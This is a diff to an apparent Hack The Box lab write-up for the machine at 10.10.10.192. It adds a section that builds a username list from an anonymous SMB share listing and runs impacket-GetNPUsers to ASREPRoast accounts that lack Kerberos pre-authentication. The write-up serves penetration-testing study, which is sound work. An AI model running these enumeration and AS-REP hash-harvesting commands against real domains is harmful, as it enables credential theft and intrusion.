@@ -60,7 +60,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 71.98 seconds
 ```
 
-SMB Enumeration
+---
+
+## SMB Enumeration
   - Anonymous and Guest Enumeration 
 ```
 ▶ smbmap -H 10.10.10.192 -u guest
@@ -70,3 +72,16 @@ SMB Enumeration
 SMB shares reveal two non-default shares named `forensic` and `profiles$`. The share `forensic` is not accessible however read-only access is allowed on the `profiles$` share. 
 
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/9a1f88cc-ce6c-4ee0-85b8-97579f3e5553)
+
+---
+
+## Kerberos
+  - Kerberos Pre-Authentication Attack (ASREPRoast)
+  - Craft a list of users to spray the users
+```CSS
+▶ smbclient -N \\\\10.10.10.192\\profiles$ -c ls | awk '{ print $1 }' | tee users.txt
+```
+```CSS
+▶ impacket-GetNPUsers blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/99b7e598-7179-457a-84ab-5ff137a3ed46)
